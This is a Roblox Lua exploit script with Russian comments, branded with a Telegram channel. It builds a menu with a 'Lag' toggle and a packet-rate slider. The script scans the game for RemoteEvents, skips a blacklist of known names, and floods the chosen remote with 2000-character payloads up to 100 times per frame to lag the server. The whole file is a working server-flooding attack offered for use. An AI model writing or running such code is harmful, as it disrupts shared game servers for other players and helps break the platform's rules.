-- Services
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer

-- === ПОЛНЫЙ BLACKLIST (ЭТИ РЕМОУТЫ ИГНОРИРУЮТСЯ) ===
-- Если скрипт найдет только их, он напишет, что сервер не поддерживается.
local blacklistedNames = {
    "PlaceCooldownFromChat", "AdminPanelService", "AdminPanel",
    "IntegrityCheckProcessor", "LocalizationTableAnalyticsSender",
    "LocalizationService", "Analytics", "Telemetry", "Logger",
    "Reporter", "CanChatWith", "SetPlayerBlockList", "UpdatePlayerBlockList",
    "NewPlayerGroupDetails", "NewPlayerCanManageDetails", "SendPlayerBlockList",
    "UpdateLocalPlayerBlockList", "SendPlayerProfileSettings",
    "RequestPlayerProfileSettings", "UpdatePlayerProfileSettings",
    "ShowFriendJoinedPlayerToast", "ShowPlayerJoinedFriendsToast",
    "CreateOrJoinParty", "ServerSideBulkPurchaseEvent", "SetDialogInUse",
    "ContactListInvokeIrisInvite", "ContactListIrisInviteTeleport",
    "UpdateCurrentCall", "RequestDeviceCameraOrientationCapability",
    "ReceiveLikelySpeakingUsers", "ReferredPlayerJoin", "Update",
    "RE/Tools/Cooldown", "RE/FuseMachine/RevealNow", "RE/FuseMachine/FuseAnimation",
    "RE/NotificationService/Notify", "RE/PlotService/ClaimCoins",
    "RE/PlotService/Sell", "RE/PlotService/Open", "RE/PlotService/ToggleFriends",
    "RE/PlotService/CashCollected", "RE/ChatService/ChatMessage",
    "RE/SoundService/PlayClientSound", "RE/Snapshot/RealiableChannel",
    "RE/CommandsService/OpenCommandBar", "RE/92e5a494-0ab4-4c4e-ae6b-96e5f4a2a698",
    "92e5a494-0ab4-4c4e-ae6b-96e5f4a2a698", "6411a778-07a5-4513-b1c7-60b65ae05ac8",
    "RE/GameService/SpawnEffect", "RE/Leaderboard/ReplicateDisplayNames",
    "eb9dee81-7718-4020-b6b2-219888488d13", "fce51e06-a587-4ff0-9e19-869eb1859a01",
    "680db8c7-c46a-492c-b451-6e980910902c", "RE/StealService/Grab",
    "RE/PlotService/Place", "RE/StealService/StealingSuccess",
    "RE/StealService/StealingFailure", "RE/CombatService/ApplyImpulse",
    "RE/InventoryService/Sort", "RE/StockEventService/SetFocused",
    "RE/StockEventService/Return", "RE/StockEventService/Redeem",
    "RE/MerchantService/SetFocused", "RE/MerchantService/Animation",
    "RE/SantaMerchantService/SetFocused", "RE/SantaMerchantService/Animation",
    "RE/SantaMerchantService/CollectGoldElf", "RE/ShopService/Purchase",
    "RE/TutorialService/StartTutorial", "RE/TutorialService/FinishTutorial",
    "RE/TeleportService/Reconnect"
}

-- Приоритетные цели (если найдет их — подключится сразу)
local priorityTargets = {
    "WhyAreTheyTargetingMe!!", "FisherMan", "Chat", "AFK", "CookiesService"
}

-- === НАСТРОЙКИ ===
local Settings = {
    LagEnabled = false,
    PacketsPerSecond = 5,
    MaxPackets = 100
}

local TargetRemote = nil
local uuid = "d80e2217-36b8-4bdc-9a46-2281c6f70b28"

-- === UI ИНТЕРФЕЙС ===
if game.CoreGui:FindFirstChild("WerzzMenuV2") then
    game.CoreGui.WerzzMenuV2:Destroy()
elseif LocalPlayer.PlayerGui:FindFirstChild("WerzzMenuV2") then
    LocalPlayer.PlayerGui.WerzzMenuV2:Destroy()
end

local GuiConfig = {
    Size = UDim2.new(0, 230, 0, 180), 
    Transparency = 0.1,
    CornerSize = 12,
    Colors = {
        Bg = Color3.fromRGB(20, 15, 15),
        Accent = Color3.fromRGB(255, 140, 60),
        ButtonDark = Color3.fromRGB(30, 25, 25),
        TextWhite = Color3.fromRGB(240, 240, 240),
        TextDim = Color3.fromRGB(180, 180, 180),
        SliderTrack = Color3.fromRGB(40, 35, 35),
        Green = Color3.fromRGB(80, 255, 120),
        Red = Color3.fromRGB(255, 80, 80)
    }
}

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "WerzzMenuV2"
ScreenGui.ResetOnSpawn = false
if pcall(function() ScreenGui.Parent = game:GetService("CoreGui") end) then else ScreenGui.Parent = LocalPlayer.PlayerGui end

local MainFrame = Instance.new("Frame")
MainFrame.Name = "Main"
MainFrame.Size = GuiConfig.Size
MainFrame.Position = UDim2.new(0.5, -GuiConfig.Size.X.Offset/2, 0.4, 0)
MainFrame.BackgroundColor3 = GuiConfig.Colors.Bg
MainFrame.BackgroundTransparency = GuiConfig.Transparency
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, GuiConfig.CornerSize)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = GuiConfig.Colors.Accent
UIStroke.Thickness = 1
UIStroke.Transparency = 0.2
UIStroke.Parent = MainFrame

-- Header
local Header = Instance.new("TextLabel")
Header.Size = UDim2.new(1, 0, 0, 30)
Header.Position = UDim2.new(0, 0, 0, 10)
Header.BackgroundTransparency = 1
Header.Text = "t.me/scriptsabhub"
Header.TextColor3 = GuiConfig.Colors.Accent
Header.Font = Enum.Font.GothamBold
Header.TextSize = 14
Header.Parent = MainFrame

-- Status Label
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(1, 0, 0, 15)
StatusLabel.Position = UDim2.new(0, 0, 0, 35)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "Checking Support..."
StatusLabel.TextColor3 = GuiConfig.Colors.TextDim
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextSize = 11
StatusLabel.Parent = MainFrame

-- Helper Function
local function createButton(name, text, yPos, height, widthScale, xOffset)
    local Btn = Instance.new("TextButton")
    Btn.Name = name
    Btn.Size = UDim2.new(widthScale, -20, 0, height)
    if widthScale == 1 then
        Btn.Position = UDim2.new(0, 10, 0, yPos)
    else
        Btn.Position = UDim2.new(0, xOffset, 0, yPos)
    end
    Btn.BackgroundColor3 = GuiConfig.Colors.ButtonDark
    Btn.BackgroundTransparency = 0
    Btn.Text = text
    Btn.TextColor3 = GuiConfig.Colors.TextWhite
    Btn.Font = Enum.Font.GothamMedium
    Btn.TextSize = 13
    Btn.AutoButtonColor = true
    Btn.Parent = MainFrame
    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 8)
    Corner.Parent = Btn
    return Btn
end

local BtnLag = createButton("Lag", "Lag: Off", 65, 35, 1, 0)

-- Slider
local SliderLabel = Instance.new("TextLabel")
SliderLabel.Text = "Packets: " .. Settings.PacketsPerSecond
SliderLabel.Size = UDim2.new(1, -20, 0, 20)
SliderLabel.Position = UDim2.new(0, 10, 0, 110)
SliderLabel.BackgroundTransparency = 1
SliderLabel.TextColor3 = GuiConfig.Colors.TextWhite
SliderLabel.Font = Enum.Font.Gotham
SliderLabel.TextSize = 11
SliderLabel.TextXAlignment = Enum.TextXAlignment.Left
SliderLabel.Parent = MainFrame

local SliderTrack = Instance.new("TextButton")
SliderTrack.Text = ""
SliderTrack.AutoButtonColor = false
SliderTrack.Size = UDim2.new(1, -20, 0, 4)
SliderTrack.Position = UDim2.new(0, 10, 0, 135)
SliderTrack.BackgroundColor3 = GuiConfig.Colors.SliderTrack
SliderTrack.BorderSizePixel = 0
SliderTrack.Parent = MainFrame
local TrackCorner = Instance.new("UICorner")
TrackCorner.CornerRadius = UDim.new(1, 0)
TrackCorner.Parent = SliderTrack

local SliderKnob = Instance.new("Frame")
SliderKnob.Size = UDim2.new(0, 14, 0, 14)
SliderKnob.AnchorPoint = Vector2.new(0.5, 0.5)
SliderKnob.Position = UDim2.new(0, 0, 0.5, 0)
SliderKnob.BackgroundColor3 = Color3.fromRGB(255, 200, 150)
SliderKnob.Parent = SliderTrack
local KnobCorner = Instance.new("UICorner")
KnobCorner.CornerRadius = UDim.new(1, 0)
KnobCorner.Parent = SliderKnob

local Footer = Instance.new("TextLabel")
Footer.Size = UDim2.new(1, 0, 0, 20)
Footer.Position = UDim2.new(0, 0, 1, -20)
Footer.BackgroundTransparency = 1
Footer.Text = "ez skid lura.ph"
Footer.TextColor3 = GuiConfig.Colors.TextDim
Footer.TextTransparency = 0.5
Footer.Font = Enum.Font.Gotham
Footer.TextSize = 10
Footer.Parent = MainFrame

-- === ЛОГИКА UI ===
local isDraggingSlider = false
local function updateSlider(input)
    local pos = input.Position.X
    local trackAbsPos = SliderTrack.AbsolutePosition.X
    local trackAbsSize = SliderTrack.AbsoluteSize.X
    local percent = math.clamp((pos - trackAbsPos) / trackAbsSize, 0, 1)
    SliderKnob.Position = UDim2.new(percent, 0, 0.5, 0)
    local value = math.max(1, math.floor(percent * Settings.MaxPackets))
    Settings.PacketsPerSecond = value
    SliderLabel.Text = "Packets: " .. tostring(value)
end

SliderTrack.MouseButton1Down:Connect(function() isDraggingSlider = true end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then isDraggingSlider = false end
end)
UserInputService.InputChanged:Connect(function(input)
    if isDraggingSlider and input.UserInputType == Enum.UserInputType.MouseMovement then updateSlider(input) end
end)

local function updateButtonVisual(button, state, prefix)
    if state then
        button.BackgroundColor3 = GuiConfig.Colors.Accent
        button.Text = prefix .. ": On"
        button.TextColor3 = Color3.new(1,1,1)
    else
        button.BackgroundColor3 = GuiConfig.Colors.ButtonDark
        button.Text = prefix .. ": Off"
        button.TextColor3 = GuiConfig.Colors.TextWhite
    end
end

BtnLag.MouseButton1Click:Connect(function()
    if not TargetRemote then return end -- Если Remote нет, кнопка не работает
    Settings.LagEnabled = not Settings.LagEnabled
    updateButtonVisual(BtnLag, Settings.LagEnabled, "Lag")
    if Settings.LagEnabled then
        StatusLabel.Text = "Status: Sending Packets..."
        StatusLabel.TextColor3 = GuiConfig.Colors.Accent
    else
        StatusLabel.Text = "Status: Idle"
        StatusLabel.TextColor3 = GuiConfig.Colors.Green
    end
end)

-- === СКАНЕР (ПРОВЕРКА НА BLACKLIST) ===
local function findTarget()
    local foundRemotes = {}
    
    -- Сканируем все RemoteEvent в игре
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local fullName = v:GetFullName()
            local remoteName = v.Name
            local isBlacklisted = false
            
            -- Проверяем, есть ли имя в твоем списке "Не поддерживается"
            for _, blacklisted in ipairs(blacklistedNames) do
                -- plain=true нужен, чтобы символы типа "/" читались как текст, а не код
                if string.find(fullName, blacklisted, 1, true) or string.find(remoteName, blacklisted, 1, true) then
                    isBlacklisted = true
                    break
                end
            end
            
            -- Если не в черном списке - это валидный Remote
            if not isBlacklisted then
                -- Если в приоритете - берем сразу
                for _, priority in ipairs(priorityTargets) do
                    if string.find(remoteName, priority, 1, true) then
                        return v
                    end
                end
                table.insert(foundRemotes, v)
            end
        end
    end
    
    -- Берем первый найденный валидный ремоут
    if #foundRemotes > 0 then return foundRemotes[1] end
    return nil
end

TargetRemote = findTarget()

-- ПРОВЕРКА РЕЗУЛЬТАТА
if TargetRemote then
    -- Нашли рабочий ремоут (не из черного списка)
    StatusLabel.Text = "Connected: " .. TargetRemote.Name
    StatusLabel.TextColor3 = GuiConfig.Colors.Green
else
    -- Нашли ТОЛЬКО ремоуты из черного списка или вообще ничего
    StatusLabel.Text = "Failed: Not Supported"
    StatusLabel.TextColor3 = GuiConfig.Colors.Red
    BtnLag.Text = "Not Supported"
    BtnLag.AutoButtonColor = false
    BtnLag.BackgroundColor3 = Color3.fromRGB(50, 20, 20)
end

-- === LAGGER LOOP (С МГНОВЕННЫМ ВЫКЛЮЧЕНИЕМ) ===
RunService.Heartbeat:Connect(function()
    if not Settings.LagEnabled or not TargetRemote then return end

    local payload = string.rep("X", 2000)
    
    for i = 1, Settings.PacketsPerSecond do
        -- ГЛАВНАЯ ФИШКА: Если выключили кнопку, цикл прерывается СРАЗУ
        if not Settings.LagEnabled then break end
        
        pcall(function() TargetRemote:FireServer(uuid, payload) end)
    end
end)

-- === DRAG ===
local dragging, dragInput, dragStart, startPos
local function updateDrag(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end
MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then updateDrag(input) end
end)
